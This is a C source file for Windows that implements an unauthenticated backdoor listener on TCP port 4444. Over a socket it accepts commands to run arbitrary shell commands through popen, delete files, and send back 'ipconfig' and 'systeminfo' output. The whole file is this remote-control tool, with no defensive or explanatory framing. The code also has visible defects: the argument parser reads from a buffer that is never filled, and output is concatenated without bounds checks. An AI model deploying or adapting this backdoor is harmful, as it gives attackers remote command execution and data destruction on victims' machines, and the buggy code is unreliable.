#include <stdio.h>
#include <winsock2.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int recvTimeOutTCP(SOCKET socket, long sec, long usec)
{
   struct timeval timeout;
   struct fd_set fds;

   timeout.tv_sec = sec; //assign the second value
   timeout.tv_usec = usec; //assign the micro second value

   FD_ZERO(&fds);
   FD_SET(socket, &fds);

   return select(0, &fds, 0, 0, &timeout); //return -1 on error, 0 on timeout, > 0 if data ready
}

void runCommand(int sockFD, const char *argument)
{
    FILE *fp;
    char path[1035];
    char output[1024] = {0};
    int sentData;

    fp = popen(argument, "r");

    if (fp == NULL)
    {
        printf("Failed to execute command.\n");
	exit(1);
    }

    while (fgets(path, sizeof(path), fp) != NULL)
    {
        strcat(output, path);
    }

    sentData = send(sockFD, output, strlen(output), 0);
}

void deleteFile(int sockFD, const char *argument)
{
    int sentData;
    char success[] = "File deleted successfully!\n";
    char failure[] = "File could not be deleted!\n";

    if (remove(argument) == 0)
    {
        sentData = send(sockFD, success, strlen(success), 0);
    }

    else 
    {
        sentData = send(sockFD, failure, strlen(failure), 0);
    }
}

void systemInfo(int sockFD)
{
    FILE *fp;
    char path[1035];
    char output[1024] = {0};
    int sentData;

    fp = popen("ipconfig & systeminfo", "r");

    if (fp == NULL)
    {
        printf("Failed to execute command.\n");
	exit(1);
    }

    else
    {
        while (fgets(path, sizeof(path), fp) != NULL)
	{
            strcat(output, path);
	}
        sentData = send(sockFD, output, strlen(output), 0);	
    }
}

const char *parseFeature(char input[])
{
    char *token = strtok(input, "(");
    return token;
}

const char *parseArgument(char input[])
{
    char *token;
    strtok(input, "(");
    token = strtok(NULL, ")");
    return token;
}

int main (int argc, char *argv[])
{
    WSADATA wsaData;
    SOCKET ListeningSocket, NewConnection;
    SOCKADDR_IN ServerAddr, SenderInfo;

    int port = 4444;
    int BytesReceived, i, nlen, SelectTiming;
    char buffer[1024] = {0};
    char buffer_1[1024] = {0};

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        printf("Winsock initialization failed: %ld.\n", WSAGetLastError());
	return 1;
    }

    else
    {
        printf("Ready to use, status: %s.\n", wsaData.szSystemStatus);
    }

    if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) //could not find usable winsock DLL
    {
        printf("Could not find usable winsock DLL 5u.%u\n.", LOBYTE(wsaData.wVersion), HIBYTE(wsaData.wVersion));
	WSACleanup();
	return 1;
    }

    else
    {
        printf("DLL supports the winsock version\n");
    }

    ListeningSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (ListeningSocket == INVALID_SOCKET)
    {
        printf("Error making socket: %ld.\n", WSAGetLastError());
	WSACleanup();
	return 1;
    }

    else 
    {
        printf("Socket created successfully.\n");
    }

    ServerAddr.sin_family = AF_INET;
    ServerAddr.sin_port = htons(port);
    ServerAddr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(ListeningSocket, (SOCKADDR *)&ServerAddr, sizeof(ServerAddr)) == SOCKET_ERROR)
    {
        printf("Bind error.\n");
	closesocket(ListeningSocket);
	WSACleanup();
	return 1;
    }

    if (listen(ListeningSocket, 5) == SOCKET_ERROR)
    {
        printf("Error listening: %ld.\n", WSAGetLastError());
	closesocket(ListeningSocket);
	WSACleanup();
	return 1;
    }

    SelectTiming = recvTimeOutTCP(ListeningSocket, 100, 100);

    switch (SelectTiming)
    {
        case 0:
		printf("Timeout\n");
		break;

	case -1:
		printf("Error\n");
		break;

	default:
		{
                    while(1)
		    {
                        NewConnection = SOCKET_ERROR;
			while (NewConnection == SOCKET_ERROR)
			{
                            NewConnection = accept(ListeningSocket, NULL, NULL);
			    BytesReceived = recv(NewConnection, buffer, sizeof(buffer), 0);

                            const char *feature = parseFeature(buffer);
	                    const char *argument = parseArgument(buffer_1);			    

			    if (strcmp(feature, "execute") == 0)
			    {
                                runCommand(NewConnection, argument);
			    }

			    else if (strcmp(feature, "delete") == 0)
			    {
                                deleteFile(NewConnection, argument);
			    }

			    else if (strcmp(feature, "sysinfo") == 0)
			    {
                                systemInfo(NewConnection);
			    }
			}
		    }
		}
    }

    return 0;

}
